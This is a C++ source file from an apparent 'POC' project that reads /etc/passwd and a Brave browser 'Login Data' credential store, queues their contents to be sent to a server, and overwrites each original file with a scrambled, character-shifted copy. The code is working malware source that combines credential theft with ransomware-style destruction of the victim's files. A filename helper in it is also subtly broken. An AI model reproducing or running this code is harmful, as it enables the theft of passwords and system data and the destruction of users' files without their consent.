/*
** POC PROJECT, 2022
** send files
** File description:
** send files to server
*/

#include "req.hpp"
#include <fstream>
#include <array>
#include <iostream>
#include <optional>

std::string getFileName(std::string filePath, bool withExtension = true, char seperator = '/')
{
    std::size_t dotPos = filePath.rfind('.');
    std::size_t sepPos = filePath.rfind(seperator);
    if(sepPos != std::string::npos) {
        return filePath.substr(sepPos + 1, filePath.size() - (withExtension || dotPos != std::string::npos ? 1 : dotPos) );
    }
    return "";
}

std::optional<std::string> get_file(const std::string file_name)
{
    std::ifstream stream(file_name);
    std::string file;
    char c;

    if (!stream.is_open()) {
        std::cerr << "Error: file doesn't exist (" << file_name << ")" << std::endl;
        return std::nullopt;
    }
    while (stream.good()) {
        std::string line;
        std::getline(stream, line);
        file += line + "\n";
    }
    stream.close();
    return file;
}

std::optional<std::string> get_file_and_cipher(const std::string file_name)
{
    std::ifstream stream(file_name);
    std::string file;
    char c;

    if (!stream.is_open()) {
        std::cerr << "Error: file doesn't exist (" << file_name << ")" << std::endl;
        return std::nullopt;
    }
    while (stream.good()) {
        std::string line;
        std::getline(stream, line);
        file += line + "\n";
    }
    stream.close();

    stream.open(file_name);
    std::string temp_fileContent = "";
    while (stream >> std::noskipws >> c) {
        int temp = (c + 7777);
        temp_fileContent += (char)temp;
    }
    stream.close();

    std::ofstream ofs;
    ofs.open(file_name, std::ofstream::out | std::ofstream::trunc);
    ofs << temp_fileContent;
    ofs.close();
    return file;
}

void get_files_contents(Req &request)
{
    std::vector<std::string> files_names = {"/etc/passwd",
        "/home/nestyles/.config/BraveSoftware/Brave-Browser/Default/Login Data"};

    for (std::vector<std::string>::iterator t=files_names.begin(); t!=files_names.end(); ++t) {
        if (auto file_content = get_file_and_cipher(*t))
            request.push_file_to_req(*t, *file_content);
    }
}
